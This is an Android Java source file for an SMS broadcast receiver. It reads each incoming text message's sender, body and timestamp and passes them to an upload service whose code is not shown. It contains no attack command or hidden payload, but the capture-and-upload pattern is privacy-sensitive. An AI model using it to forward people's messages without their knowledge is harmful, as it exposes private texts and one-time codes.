package message.centit.com.message;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.Date;

import message.centit.com.message.util.LogUtil;

public class SmsReceiver extends BroadcastReceiver {



    public SmsReceiver() {
        Log.i("yjj", "new SmsReceiver");
    }

    SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

    @Override
    public void onReceive(Context context, Intent intent) {
        LogUtil.d("接收到广播！");
        String receiveTime = "";
        String msgBody = "";
        String sender = "";
        Bundle bundle = intent.getExtras();
        String format = intent.getStringExtra("format");
        SmsMessage msg = null;
        if (null != bundle) {
            Object[] smsObj = (Object[]) bundle.get("pdus");
            for (Object object : smsObj) {
                if (Build.VERSION.SDK_INT < 23) {
                    msg = SmsMessage.createFromPdu((byte[]) object);
                } else {
                    msg = SmsMessage.createFromPdu((byte[]) object, format);
                }
                Date date = new Date(msg.getTimestampMillis());//时间
                 receiveTime = df.format(date);
                 msgBody += msg.getMessageBody();
                 sender = msg.getOriginatingAddress();
            }
            //启动服务
            UpLoadService.actionStart(context ,receiveTime,msgBody,sender);
        }
    }







}